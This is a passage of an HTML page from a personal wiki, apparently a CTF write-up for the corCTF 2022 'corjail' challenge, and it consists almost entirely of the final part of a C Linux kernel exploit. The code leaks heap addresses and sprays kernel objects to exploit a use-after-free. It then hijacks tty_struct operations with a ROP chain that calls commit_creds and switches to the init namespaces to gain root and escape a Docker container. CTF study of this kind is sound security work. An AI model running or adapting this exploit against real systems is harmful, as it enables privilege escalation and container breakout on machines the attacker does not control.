</span></span><span style=display:flex><span>      (tmp[ix] <span style=color:#f92672>&gt;&gt;</span> (<span style=color:#ae81ff>64</span><span style=color:#f92672>-</span><span style=color:#ae81ff>4</span><span style=color:#f92672>*</span><span style=color:#ae81ff>4</span>)) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xFFFF</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75715e>// tty must be in kheap
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      (tmp[ix <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>] <span style=color:#f92672>&gt;&gt;</span> (<span style=color:#ae81ff>64</span><span style=color:#f92672>-</span><span style=color:#ae81ff>4</span><span style=color:#f92672>*</span><span style=color:#ae81ff>4</span>)) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xFFFF</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75715e>// file must be in kheap
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      tmp[ix<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>] <span style=color:#f92672>==</span> tmp[ix<span style=color:#f92672>+</span><span style=color:#ae81ff>3</span>] <span style=color:#f92672>&amp;&amp;</span> tmp[ix<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>] <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75715e>// list_head&#39;s next and prev are same
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      (tmp[ix] <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFF</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x00</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75715e>// tty must be 0x100 aligned
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      (tmp[ix <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>] <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFF</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x00</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75715e>// file must be 0x100 aligned
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      (tmp[ix <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>] <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xF</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x08</span>
</span></span><span style=display:flex><span>    ) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (km1024_leaked <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>        km1024_leaked <span style=color:#f92672>=</span> tmp[ix];
</span></span><span style=display:flex><span>        printf(<span style=color:#e6db74>&#34;[!] </span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>+0: 0x%lx (tty)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tmp[ix]);
</span></span><span style=display:flex><span>        printf(<span style=color:#e6db74>&#34;[!] </span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>+1: 0x%lx (*file)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tmp[ix <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>        printf(<span style=color:#e6db74>&#34;[!] </span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>+2: 0x%lx (list_head.next)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tmp[ix <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>]);
</span></span><span style=display:flex><span>        printf(<span style=color:#e6db74>&#34;[!] </span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>+3: 0x%lx (list_head.prev)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tmp[ix <span style=color:#f92672>+</span> <span style=color:#ae81ff>3</span>]);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (km1024_leaked <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>    print_curious(keybuf, <span style=color:#ae81ff>0x4300</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    errExit(<span style=color:#e6db74>&#34;Failed to leak kmalloc-1024&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;[!] leaked kmalloc-1024: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, km1024_leaked);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>/********************************************************/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Free `seq_operations`, one of which is `user_key_payload`
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> NUM_SEQOPERATIONS <span style=color:#f92672>-</span> NUM_FREE_SEQOPERATIONS; ix <span style=color:#f92672>!=</span> NUM_SEQOPERATIONS; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    close(seqops_fd[ix]);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;[+] Freeed seq_operations&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  sleep(<span style=color:#ae81ff>5</span>); <span style=color:#75715e>// TODO
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// Spray `poll_list` in kmalloc-32, one of which is placed on `user_key_payload`
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  assign_to_core(<span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>  neverend <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;[+] spraying `poll_list` in kmalloc-32...&#34;</span>);
</span></span><span style=display:flex><span>  num_threads <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_2ND_POLLLIST_ALLOC; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> alloc_poll_list_t <span style=color:#f92672>*</span>arg <span style=color:#f92672>=</span> malloc(<span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> alloc_poll_list_t));
</span></span><span style=display:flex><span>    arg<span style=color:#f92672>-&gt;</span>fd <span style=color:#f92672>=</span> just_fd; arg<span style=color:#f92672>-&gt;</span>id <span style=color:#f92672>=</span> ix;
</span></span><span style=display:flex><span>    arg<span style=color:#f92672>-&gt;</span>timeout_ms <span style=color:#f92672>=</span> <span style=color:#ae81ff>3000</span>; <span style=color:#75715e>// must 1000 &lt; timeout_ms, to wait key GC
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    arg<span style=color:#f92672>-&gt;</span>num_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>30</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(pthread_create(<span style=color:#f92672>&amp;</span>threads[ix], NULL, alloc_poll_list, arg) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;pthread_create&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#75715e>// wait threads are initialized (to prevent double free)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  assign_to_core(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span>(num_threads <span style=color:#f92672>!=</span> NUM_2ND_POLLLIST_ALLOC);
</span></span><span style=display:flex><span>  usleep(<span style=color:#ae81ff>300</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Revoke UAFed key, which is on `poll_list` in kmalloc-32
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  puts(<span style=color:#e6db74>&#34;[+] Freeing UAFed key...&#34;</span>);
</span></span><span style=display:flex><span>  free_key(uafed_key);
</span></span><span style=display:flex><span>  sleep(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Spray keys on UAFed `poll_list`
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  puts(<span style=color:#e6db74>&#34;[+] spraying keys in kmalloc-32&#34;</span>);
</span></span><span style=display:flex><span>  assert(num_keys <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>key_payload <span style=color:#f92672>=</span> malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
</span></span><span style=display:flex><span>    memset(key_payload, <span style=color:#e6db74>&#39;X&#39;</span>, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
</span></span><span style=display:flex><span>    ((ulong<span style=color:#f92672>*</span>)key_payload)[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x9999999999999999</span>; <span style=color:#75715e>// debug
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     _alloc_key_prefill_ulong_val <span style=color:#f92672>=</span> km1024_leaked <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x18</span>; <span style=color:#75715e>// 0x18 is offset where `user_key_payload` can modify from
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_2ND_KEY_SPRAY; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>      alloc_key(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_ulong);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;[+] waiting corrupted `poll_list` is freed...&#34;</span>);
</span></span><span style=display:flex><span>  neverend <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_2ND_POLLLIST_ALLOC; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    pthread_join(threads[ix], NULL);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Free all keys
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_2ND_KEY_SPRAY; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    free_key(keys[ix]);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;[+] waiting all keys are freed by GC...&#34;</span>);
</span></span><span style=display:flex><span>  sleep(<span style=color:#ae81ff>1</span>); <span style=color:#75715e>// wait GC(security/keys/gc.c) actually frees keys
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Spray keys in `kmalloc-1024`, one of which must be placed on `tty_struct`
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  puts(<span style=color:#e6db74>&#34;[+] spraying keys in kmalloc-1024&#34;</span>);
</span></span><span style=display:flex><span>  assert(num_keys <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>key_payload <span style=color:#f92672>=</span> malloc(<span style=color:#ae81ff>0x1000</span>);
</span></span><span style=display:flex><span>    ulong <span style=color:#f92672>*</span>buf <span style=color:#f92672>=</span> (ulong<span style=color:#f92672>*</span>)key_payload;
</span></span><span style=display:flex><span>    buf[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x5401</span>; <span style=color:#75715e>// magic, kref (later `leave`ed and become RBP)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    buf[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff8191515a</span>); <span style=color:#75715e>// dev (later become ret addr of `leave` gadget, which is `pop rsp`)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    buf[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> km1024_leaked <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x50</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x120</span>; <span style=color:#75715e>// driver (MUST BE VALID) (later `pop rsp`ed)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    buf[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> km1024_leaked <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x50</span>; <span style=color:#75715e>// ops
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    ulong <span style=color:#f92672>*</span>ops <span style=color:#f92672>=</span> (ulong<span style=color:#f92672>*</span>)(key_payload <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x50</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0x120</span> <span style=color:#f92672>/</span> <span style=color:#ae81ff>8</span>; <span style=color:#f92672>++</span>ix) { <span style=color:#75715e>// sizeof tty_operations
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      ops[ix] <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81577609</span>); <span style=color:#75715e>// pop rsp
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    ulong <span style=color:#f92672>*</span>rop <span style=color:#f92672>=</span> (ulong<span style=color:#f92672>*</span>)((<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)ops <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x120</span>);
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81906510</span>); <span style=color:#75715e>// pop rdi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff810ebc90</span>); <span style=color:#75715e>// prepare_kernel_cred
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff812c32a9</span>); <span style=color:#75715e>// pop rcx (to prevent later `rep`)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop <span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81a05e4b</span>); <span style=color:#75715e>// mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff810eba40</span>); <span style=color:#75715e>// commit_creds
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81906510</span>); <span style=color:#75715e>// pop rdi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>; <span style=color:#75715e>// init process in docker container
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff810e4fc0</span>); <span style=color:#75715e>// find_task_by_vpid
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff812c32a9</span>); <span style=color:#75715e>// pop rcx (to prevent later `rep`)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop <span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81a05e4b</span>); <span style=color:#75715e>// mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff819b21d3</span>); <span style=color:#75715e>// pop rsi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff8245a720</span>); <span style=color:#75715e>// &amp;init_nsproxy
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff810ea4e0</span>); <span style=color:#75715e>// switch_task_namespaces
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81906510</span>); <span style=color:#75715e>// pop rdi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff82589740</span>); <span style=color:#75715e>// &amp;init_fs
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff812e7350</span>); <span style=color:#75715e>// copy_fs_struct
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff8131dab0</span>); <span style=color:#75715e>// push rax; pop rbx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81906510</span>); <span style=color:#75715e>// pop rdi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> getpid();
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff810e4fc0</span>); <span style=color:#75715e>// find_task_by_vpid
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff8117668f</span>); <span style=color:#75715e>// pop rdx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x6E0</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81029e7d</span>); <span style=color:#75715e>// add rax, rdx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff817e1d6d</span>); <span style=color:#75715e>// mov qword [rax], rbx ; pop rbx ; ret ; (1 found)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#75715e>// trash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81c00ef0</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x16</span>); <span style=color:#75715e>// swapgs_restore_regs_and_return_to_usermode + 0x16
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                                               <span style=color:#75715e>// mov rdi,rsp; mov rsp,QWORD PTR gs:0x6004; push QWORD PTR [rdi+0x30]; ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> (ulong)NIRUGIRI;
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> user_cs;
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> user_rflags;
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> (ulong)krop_stack <span style=color:#f92672>+</span> KROP_USTACK_SIZE <span style=color:#f92672>/</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> user_ss;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    printf(<span style=color:#e6db74>&#34;[+] size: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, (ulong)rop <span style=color:#f92672>-</span> (ulong)key_payload);
</span></span><span style=display:flex><span>    assert((ulong)rop <span style=color:#f92672>-</span> (ulong)key_payload <span style=color:#f92672>&lt;=</span> NUM_3RD_KEY_SIZE);
</span></span><span style=display:flex><span>    assert(<span style=color:#ae81ff>512</span> <span style=color:#f92672>&lt;</span> NUM_3RD_KEY_SIZE <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x10</span> <span style=color:#f92672>&amp;&amp;</span> NUM_3RD_KEY_SIZE <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x10</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1024</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_3RD_KEY_SPRAY; <span style=color:#f92672>++</span>ix) alloc_key(key_payload, NUM_3RD_KEY_SIZE <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x10</span>, NULL);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Invoke tty_struct.ops.ioctl
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  puts(<span style=color:#e6db74>&#34;[+] ioctl-ing to /dev/ptmx&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_TTY_SPRAY; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    ioctl(tty_fd[ix], <span style=color:#ae81ff>0x1234567890</span>, <span style=color:#ae81ff>0xABCDE0000</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// end of life (unreachable)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  puts(<span style=color:#e6db74>&#34;[ ] END of life...&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#75715e>//sleep(999999);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><h2 id=参考>参考</h2><ul><li><a href=https://syst3mfailure.io/corjailhttps://syst3mfailure.io/corjail>Author&rsquo;s writeup</a></li><li><a href=https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/pwn/corjail/task/build>corCTF2022 archive</a></li></ul><div class=section-index></div><br><div class=page-blank><div id=disqus_thread></div><script>(function(){var e=document,t=e.createElement("script");t.src="https://https-wiki-smallkirby-xyz.disqus.com/embed.js",t.setAttribute("data-timestamp",+new Date),(e.head||e.body).appendChild(t)})()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div><div class="text-muted mt-5 pt-3 border-top">Last modified November 24, 2022: <a href=https://github.com/smallkirby/wikirby/commit/ccc3cf577834b90edbfd73e91ebcd0d1135776ca>init ctf section (ccc3cf5)</a></div></div></main></div></div><footer class="bg-dark py-5 row d-print-none"><div class="container-fluid mx-sm-5"><div class=row><div class="col-6 col-sm-4 text-xs-center order-sm-2"><ul class="list-inline mb-0"><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Twitter aria-label=Twitter><a class=text-white target=_blank rel=noopener href=https://twitter.com/smallkirby aria-label=Twitter><i class="fab fa-twitter"></i></a></li><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=GitHub aria-label=GitHub><a class=text-white target=_blank rel=noopener href=https://github.com/smallkirby aria-label=GitHub><i class="fab fa-github"></i></a></li></ul></div><div class="col-6 col-sm-4 text-right text-xs-center order-sm-3"><ul class="list-inline mb-0"><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=GitHub aria-label=GitHub><a class=text-white target=_blank rel=noopener href=https://github.com/smallkirby/wikirby aria-label=GitHub><i class="fab fa-github"></i></a></li></ul></div><div class="col-12 col-sm-4 text-center py-2 order-sm-2"><small class=text-white>&copy; 2022 smallkirby few rights reserved</small></div></div></div></footer></div><script src=/js/main.min.f1a20e761a85478d0ce3298a01e295324be8858ef8f2d2baac6737980799b320.js integrity="sha256-8aIOdhqFR40M4ymKAeKVMkvohY748tK6rGc3mAeZsyA=" crossorigin=anonymous></script>
<script src=/js/tabpane-persist.js></script></body></html>